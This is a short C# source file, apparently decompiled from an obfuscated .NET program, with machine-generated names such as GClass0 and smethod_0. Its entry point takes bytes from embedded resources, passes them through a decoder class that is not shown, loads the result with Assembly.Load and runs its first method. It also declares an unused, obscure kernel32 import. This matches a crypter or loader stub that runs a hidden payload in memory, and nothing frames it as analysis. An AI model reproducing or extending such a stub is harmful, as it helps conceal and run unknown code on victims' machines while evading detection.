using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Dematrizien;
using Dematrizien.Properties;

public class GClass0
{
	private static Action<GiveFeedbackEventHandler> action_0 = smethod_0;

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool BasepAllocateActivationContextActivationBlock(int int_0, IntPtr intptr_0, byte[] byte_0, uint uint_0, out uint uint_1);

	[STAThread]
	public static void Main(string[] args)
	{
		new GClass1();
		action_0(null);
	}

	public static void smethod_0(GiveFeedbackEventHandler giveFeedbackEventHandler_0)
	{
		if (giveFeedbackEventHandler_0 != null)
		{
			Application.ExitThread();
		}
		GClass3.byte_0 = (byte[])Resources.Byte_0.Clone();
		GClass1 gClass = new GClass1();
		byte[] rawAssembly = GClass4.smethod_0();
		gClass.method_1(Assembly.Load(rawAssembly).GetTypes()[0].GetMethods()[0], null, new object[0]);
	}
}
